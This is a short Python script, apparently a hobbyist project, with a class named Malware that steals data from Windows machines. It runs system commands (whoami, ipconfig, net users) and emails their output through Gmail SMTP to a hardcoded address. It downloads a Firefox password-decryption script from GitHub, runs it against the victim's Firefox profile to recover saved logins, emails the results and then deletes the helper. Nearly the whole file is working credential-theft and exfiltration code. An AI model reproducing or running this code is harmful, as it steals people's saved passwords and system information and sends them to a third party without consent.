#!usr/bin/env python3 
#codign cp850
import subprocess
import requests
import smtplib
import os
import tempfile
from email.mime.text import MIMEText

class Malware:  
    def __init__(self) -> None:
        self.temp_dir = tempfile.mkdtemp()
        self.user_of_system = ""

    def send_email(self, body, subject, remitent= "attritusdotcom@gmail.com", destinararies=["your gmail"], password="clave de apliacion"):
        message = MIMEText(body)
        message["Subject"]= subject
        message["To"]= ', '.join(destinararies)
        message["From"] = remitent
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as sender:
            sender.login(remitent, password)
            sender.sendmail(remitent, destinararies, message.as_string())

    def run_command(self, comand, subject):
        try:
            output = subprocess.check_output(comand, shell=True)
            if comand == "whoami":
                self.user_of_system = (output.decode("cp850")).split("\\")[1].strip()
            self.send_email(output.decode('cp850'), subject)
        except Exception as e:
            self.send_email(f"ERROR", f"{e}\n Ocurrio al ejecutar {comand}")
    def get_profiles_of_firefox(self):
        path = rf"C:\\Users\\{self.user_of_system}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"
        profile = [ rf"{path}\\{profile}"  for profile in os.listdir(path) if "release" in profile]
        return profile[0] if profile else None

    def get_password_of_firefox(self):
        r = requests.get("https://raw.githubusercontent.com/unode/firefox_decrypt/main/firefox_decrypt.py")
        os.chdir(self.temp_dir)
        with open("decrypt.py", "wb") as f:
            f.write(r.content)
        self.run_command(f"python3 decrypt.py {self.get_profiles_of_firefox()}", "EJECUCCION DEL DECRYPT DE FIREFOX")
        os.remove("decrypt.py")
        return True
        


if __name__ == "__main__":
    mal = Malware()
    comands ={"ipconfig": "VER INFORMACION DE RED", "net users": "VER INFORMACION DE USUARIOS DEL SISTEMA", "whoami": "Ver usuario actual de sistema"}
    #for command in comands.keys():
    #    mal.run_command(command, comands[command])
    mal.run_command("whoami", "xdxdxd") #username
    print(mal.get_password_of_firefox())
            








